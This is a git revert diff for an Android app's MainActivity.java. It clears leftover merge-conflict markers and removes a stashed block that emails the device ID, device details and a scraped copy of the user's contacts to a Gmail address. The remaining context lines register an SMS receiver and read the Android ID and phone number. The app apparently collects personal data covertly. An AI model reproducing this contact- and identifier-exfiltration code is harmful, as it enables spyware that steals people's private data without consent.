3adb0fa28c2ca44e8075810937f1413eec603aa1
Mosipa <jiaric@hotmail.com>
2023-02-03 18:36:08 +0800

    Revert "Update MainActivity.java"
    This reverts commit b692093e910c731ea5371e300636c999420d72f8.

--- app/src/main/java/com/example/a2207project/MainActivity.java
+++ app/src/main/java/com/example/a2207project/MainActivity.java
@@ -10,7 +10,6 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.ContentResolver;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
@@ -24,7 +23,6 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
-
 
 import java.io.IOException;
 import java.net.InetAddress;
@@ -162,7 +160,6 @@ public class MainActivity extends AppCompatActivity {
         SMSBroadcastReceiver smsBroadcastReceiver = new SMSBroadcastReceiver();
         registerReceiver(smsBroadcastReceiver, intentFilter);
 
-<<<<<<< Updated upstream
         androidID = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         phoneNum = telephonyManager.getLine1Number();
@@ -185,10 +182,6 @@ public class MainActivity extends AppCompatActivity {
             }
         } .start();
 
-=======
-        String deviceID =Settings.Secure.getString(this.getContentResolver(),Settings.Secure.ANDROID_ID);
-        EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ deviceID, DeviceScrape.getDeviceInfo() + "\n\n\nContacts:\n-----\n" +  ContactScrape.scrapeContacts(getContentResolver()));
->>>>>>> Stashed changes
 
 
         Button button=findViewById(R.id.secondActivityButton);
